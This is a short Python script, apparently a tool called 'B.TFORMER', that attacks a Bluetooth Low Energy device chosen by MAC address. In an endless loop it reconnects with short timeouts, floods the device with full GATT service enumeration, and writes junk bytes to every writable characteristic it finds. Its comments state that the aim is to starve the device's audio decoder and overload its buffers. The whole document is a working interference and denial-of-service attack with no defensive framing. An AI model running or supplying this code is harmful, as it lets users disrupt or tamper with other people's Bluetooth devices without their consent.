import asyncio
from bleak import BleakClient

async def start_protocol_interference(target_mac):
    print(f"\n[!] B.TFORMER ACTIVE: Targeting {target_mac}")
    print("[*] Strategy A: GATT Service Enumeration Flood initiated.")
    
    count = 0
    while True:
        try:
            # Short timeout forces the script to 'hammer' the device faster
            async with BleakClient(target_mac, timeout=1.2) as client:
                count += 1
                print(f"[+] Burst #{count}: Target Synchronized. Enumerating Services...")
                
                # HEAVY OPERATION: Fetching the entire GATT database
                # This steals CPU cycles from the music decoder (A2DP)
                services = await client.get_services()
                
                # FORCE WRITE: Send a single bit to any writable characteristic
                # This is like 'poking' the device's brain repeatedly
                for service in services:
                    for char in service.characteristics:
                        if "write-without-response" in char.properties:
                            # Send a 1-byte 'junk' packet
                            await client.write_gatt_char(char.uuid, b'\xFF', response=False)
                            break
                
                print(f"    [OK] Buffer Overloaded. Resetting connection...")
                await client.disconnect()
                
        except Exception:
            # If the device is busy or refuses, we just loop faster
            count += 1
            await asyncio.sleep(0.05) # Tiny gap to prevent your laptop from hanging